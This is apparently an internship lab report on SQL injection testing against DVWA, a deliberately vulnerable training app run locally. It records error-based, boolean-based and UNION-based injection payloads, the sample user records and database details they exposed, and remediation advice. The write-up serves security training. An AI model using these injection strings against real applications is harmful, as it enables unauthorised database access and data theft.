# 💉 Week 2 — Task 1: SQL Injection Testing

**Intern (Team Lead):** Sruthi Rajeshkumar  

**Team Members:** Abhinaya | MD Abdulla | Sudarshan Yadav  

**Organization:** Zaalimaa Development Pvt Ltd  

**Project:** Project 2 — Web Application Penetration Testing (OWASP Top 10 Focus)  

**Week:** Week 2  

**Date:** 03.06.2026  

**Status:** ✅ Completed

---

## 📌 Objective
Perform SQL Injection testing on DVWA to understand how SQLi vulnerabilities work, extract sensitive data from the database, and document all findings with proof of exploitation.

**OWASP Reference:** A05:2025 - Injection  

**Platform:** DVWA (http://localhost:8080)  

**Security Level:** Low  

**Module:** SQL Injection

---

## 📸 Screenshots

- Screenshot 1: Docker containers running — `<img width="1600" height="840" alt="WhatsApp Image 2026-06-03 at 1 02 29 PM" src="https://github.com/user-attachments/assets/b012e819-fac2-412c-87fa-5d98a00ea13b" />
`
- Screenshot 2: DVWA Login page — `<img width="1600" height="840" alt="WhatsApp Image 2026-06-03 at 1 09 03 PM" src="https://github.com/user-attachments/assets/9ee0b132-71e0-447f-b8bc-8e63e02e217e" />
`
- Screenshot 3: DVWA Dashboard — `<img width="1600" height="842" alt="WhatsApp Image 2026-06-03 at 1 18 39 PM" src="https://github.com/user-attachments/assets/0f81f107-9e94-4d8b-be25-04de72097a2d" />
`
- Screenshot 4: DVWA Security set to Low — `<img width="1600" height="839" alt="WhatsApp Image 2026-06-03 at 1 21 01 PM" src="https://github.com/user-attachments/assets/0dc56cc3-2e5f-4b9b-b97c-24c205a92899" />
`
- Screenshot 5: SQL Injection module — `<img width="1600" height="843" alt="WhatsApp Image 2026-06-03 at 1 31 48 PM" src="https://github.com/user-attachments/assets/2c15d5ee-40ce-433d-b930-a63c324f3d65" />
`
- Screenshot 6: Normal query result (ID=1) — `<img width="1600" height="840" alt="WhatsApp Image 2026-06-03 at 1 35 17 PM" src="https://github.com/user-attachments/assets/a3657d3b-9005-4766-a183-50ec21578706" />
`
- Screenshot 7: SQL error message (MariaDB exposed) — `<img width="1600" height="840" alt="WhatsApp Image 2026-06-03 at 1 40 17 PM" src="https://github.com/user-attachments/assets/93582adb-d1dd-4437-a774-c0c9caca8ee6" />
`
- Screenshot 8: All users dumped — `<img width="1600" height="843" alt="WhatsApp Image 2026-06-03 at 1 44 21 PM" src="https://github.com/user-attachments/assets/c3981fad-8acb-4563-86ce-56c40df1cd4a" />
`
- Screenshot 9: UNION based - DB info extracted — `<img width="1600" height="839" alt="WhatsApp Image 2026-06-03 at 1 45 44 PM" src="https://github.com/user-attachments/assets/2590a405-662d-4316-ab05-1d2d812f69b5" />
`

---

## 🛠️ Environment Setup

| Field | Details |
|---|---|
| **OS** | Kali Linux (VMware Workstation) |
| **Platform** | DVWA v1.10 |
| **Database** | MariaDB |
| **URL** | http://localhost:8080/vulnerabilities/sqli/ |
| **Security Level** | Low |

---

## 🧪 Testing Process

### Step 1 — Normal Query (Baseline)

Input: 1

Result: ID: 1, First name: admin, Surname: admin

Observation: Normal query returns single user details


### Step 2 — Error Based SQLi

Input: 1' OR '1'='1

Result: SQL syntax error revealed

Observation: Application is vulnerable to SQLi
- Database type exposed: MariaDB


### Step 3 — Boolean Based SQLi

Input: ' OR 1=1#

Result: All 5 users dumped from database

Observation: No input sanitization — full DB dump possible



### Step 4 — UNION Based SQLi

Input: ' OR 1=1 UNION SELECT user(),database()#

Result: Database credentials exposed
- DB User: app@localhost
- DB Name: dvwa

Observation: Critical database information extracted

---

## 🔎 Findings & Results

| # | Test Type | Payload | Result | Severity |
|---|---|---|---|---|
| 1 | Normal Query | 1 | Single user returned | — |
| 2 | Error Based | 1' OR '1'='1 | MariaDB version exposed | 🔴 High |
| 3 | Boolean Based | ' OR 1=1# | All 5 users dumped | 🔴 Critical |
| 4 | Union Based | ' OR 1=1 UNION SELECT user(),database()# | DB user + DB name exposed | 🔴 Critical |

---

## 👥 Users Extracted from Database

| ID | First Name | Surname |
|---|---|---|
| 1 | admin | admin |
| 2 | Gordon | Brown |
| 3 | Hack | Me |
| 4 | Pablo | Picasso |
| 5 | Bob | Smith |

---

## 🗄️ Database Information Extracted

| Field | Value |
|---|---|
| **Database Name** | dvwa |
| **Database User** | app@localhost |
| **Database Type** | MariaDB |

---

## ⚠️ Vulnerabilities Identified

### 1. SQL Injection — Critical 🔴

- **Location:** User ID input field
- **Type:** Error Based, Boolean Based, UNION Based
- **Impact:** Full database compromise, sensitive data exposure
- **Evidence:** All user records extracted, DB credentials exposed

---

## 🛡️ Remediation Recommendations

| # | Recommendation |
|---|---|
| 1 | Use parameterized queries / prepared statements |
| 2 | Validate and sanitize all user inputs |
| 3 | Apply least privilege to database accounts |
| 4 | Use a Web Application Firewall (WAF) |
| 5 | Disable detailed error messages in production |
| 6 | Implement input length restrictions |

---

## ✅ Task Completion Status

| Team Member | Role | Status |
|---|---|---|
| Sruthi Rajeshkumar | Team Lead | ✅ Completed |
| Abhinaya | Member | ✅ Completed |
| MD Abdulla | Member | ✅ Completed |
| Sudarshan Yadav | Member | ✅ Completed |
